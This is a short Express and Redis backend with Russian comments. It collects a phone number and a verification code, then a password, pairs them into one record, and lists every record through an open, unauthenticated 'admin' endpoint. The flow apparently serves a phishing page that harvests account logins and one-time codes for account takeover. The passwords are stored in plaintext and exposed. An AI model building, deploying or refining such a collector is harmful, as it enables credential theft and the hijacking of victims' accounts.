import express from "express";
import cors from "cors";
import { createClient } from "redis";

const app = express();
app.use(express.json());
app.use(cors());

// Подключение к Redis/Valkey
const redis = createClient({
  url: process.env.REDIS_URL
});

redis.on("error", err => console.log("Redis Error:", err));
await redis.connect();

// Создаём ключ в которого кладём массив полных записей
const KEY = "full_records";

// Получить все записи
async function getAll() {
  const arr = await redis.lRange(KEY, 0, -1);
  return arr.map(x => JSON.parse(x));
}

// Сохранить все записи обратно
async function saveAll(data) {
  await redis.del(KEY);
  for (const item of data) {
    await redis.rPush(KEY, JSON.stringify(item));
  }
}

// ====== ТЕЛЕФОН ======
app.post("/save-phone", async (req, res) => {
  try {
    const { phone, code } = req.body;

    const all = await getAll();

    const id = Math.random().toString(36).substring(2, 10);

    const newItem = {
      id,
      phone,
      code,
      time_phone: new Date().toISOString()
    };

    all.push(newItem);
    await saveAll(all);

    res.json({ ok: true });
  } catch (err) {
    console.log("ERR PHONE:", err);
    res.json({ ok: false });
  }
});

// ====== ПАРОЛЬ ======
app.post("/save-password", async (req, res) => {
  try {
    const { password } = req.body;

    let all = await getAll();

    const last = all.reverse().find(item => !item.password);
    all.reverse(); // возвращаем порядок

    if (!last) {
      return res.json({ ok: false, msg: "No phone record found" });
    }

    last.password = password;
    last.time_password = new Date().toISOString();

    await saveAll(all);

    res.json({ ok: true });
  } catch (err) {
    console.log("ERR PASS:", err);
    res.json({ ok: false });
  }
});

// ====== АДМИН ======
app.get("/records", async (req, res) => {
  const all = await getAll();
  res.json(all.reverse()); // новые сверху
});

// ====== СТАРТ СЕРВЕРА ======
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Backend running on " + PORT));
